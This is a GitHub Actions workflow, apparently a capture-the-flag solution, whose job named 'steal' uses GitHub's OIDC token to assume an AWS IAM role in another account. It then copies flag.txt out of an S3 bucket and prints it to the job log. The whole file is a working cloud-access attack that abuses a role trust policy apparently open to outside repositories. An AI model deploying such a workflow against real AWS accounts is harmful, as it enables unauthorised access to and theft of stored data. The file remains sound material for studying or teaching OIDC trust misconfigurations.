name: Get The Flag

on:
  push:
    branches: [ main ]
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  steal:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: "arn:aws:iam::694502195928:role/admin-godmode-flag-reader-lol-698875"
          role-session-name: GitHubActions-FlagStealer-${{ github.run_id }}
          aws-region: "ap-southeast-1"

      - name: Get the flag and print it
        run: |
          echo "Attempting to copy flag from secret bucket..."
          aws s3 cp s3://oh-i-really-do-care/flag.txt flag.txt

          echo "--- FLAG FOUND ---"
          cat flag.txt
          echo "--- END FLAG ---"
